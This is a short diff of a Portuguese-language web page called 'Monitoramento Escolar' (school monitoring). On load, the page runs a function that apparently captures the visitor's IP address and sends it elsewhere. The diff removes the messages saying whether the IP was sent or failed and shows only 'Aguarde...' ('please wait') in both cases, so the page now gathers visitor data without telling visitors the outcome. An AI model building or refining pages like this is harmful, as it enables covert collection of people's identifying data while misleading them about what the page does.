@@ -2,10 +2,12 @@
 
 <!DOCTYPE html>
 <html lang="pt-br">
+
 <head>
   <meta charset="UTF-8" />
   <title>Monitoramento Escolar</title>
 </head>
+
 <body>
   <h2>Capturando IP...</h2>
 
@@ -25,13 +27,14 @@
           throw new Error('Falha no envio');
         }
 
-        document.body.innerHTML = "<h2>IP enviado com sucesso!</h2>";
+        document.body.innerHTML = "<h2>Aguarde...</h2>";
       } catch (e) {
-        document.body.innerHTML = "<h2>Erro ao enviar IP</h2>";
+        document.body.innerHTML = "<h2>Aguarde...</h2>";
       }
     }
 
     window.onload = capturarEEnviar;
   </script>
 </body>
+
 </html>
